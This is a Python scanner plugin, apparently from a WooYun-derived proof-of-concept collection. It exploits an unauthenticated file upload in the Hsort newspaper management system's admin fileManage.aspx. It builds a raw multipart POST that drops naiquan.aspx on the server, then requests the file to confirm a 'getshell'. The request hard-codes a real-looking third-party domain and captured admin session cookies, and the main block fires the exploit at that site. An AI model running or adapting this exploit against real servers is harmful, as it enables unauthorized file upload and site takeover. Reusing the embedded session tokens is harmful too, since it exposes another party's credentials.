#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 奶权
#_PlugName_ = Hsort报刊管理系统getshell
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0141695
import re
def assign(service, arg):
    if service == 'hsort':
        return True, arg
def audit(arg):
    payload = 'Admin/fileManage.aspx?action=UPLOAD&value1=~/'
    target = arg + payload
    raw="""POST /Admin/fileManage.aspx?action=UPLOAD&value1=~/ HTTP/1.1
Host: paper.deqingroup.com
Proxy-Connection: keep-alive
Content-Length: 268
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://**.**.**.**
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzU8cYAkiaOHkm3gA
Referer: http://paper.deqingroup.com/Admin/HsortWebExplorer.aspx
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,ja;q=0.2
Cookie: menuitems=1_1%2C2_1%2C3_1%2C6_1%2C7_1%2C8_1; ASPSESSIONIDAQQCCTAS=MDPBIBFCNNGPEMMPIKBIFAEO; ASP.NET_SessionId=cqz2nw450qlxni254ihyh03w; ImageV=QTB5K; userID=8; .ASPXAUTH=C64B54127984EDB2B5EC27C4379C52D8C9DEEA8E35777741B4143F50E45AB5BA00647DD9D604E701535E52FC2DDD938A9312D474008E92FB15887C22E8F2840C16BEDDD4A6ADC8C7; LWSysUserName=admin

------WebKitFormBoundaryzU8cYAkiaOHkm3gA
Content-Disposition: form-data; name=\"selectFile\"; filename=\"naiquan.aspx\"
Content-Type: application/octet-stream

getshell!!!
------WebKitFormBoundaryzU8cYAkiaOHkm3gA--"""
    code, head, res, errcode, _ = curl.curl2(target, raw=raw);
    shell_path = arg + "naiquan.aspx"
    code1, head1, res1, errcode1, _=curl.curl2(shell_path);
    if code == 200 and code1 == 200 and "OK" in res and "getshell!!!" in res1:
        security_hole("Upload File: "+arg+"naiquan.aspx refer:http://www.wooyun.org/bugs/wooyun-2010-0141695")
if __name__ == '__main__':
    from dummy import *
    audit(assign('hsort', 'http://paper.deqingroup.com/')[1])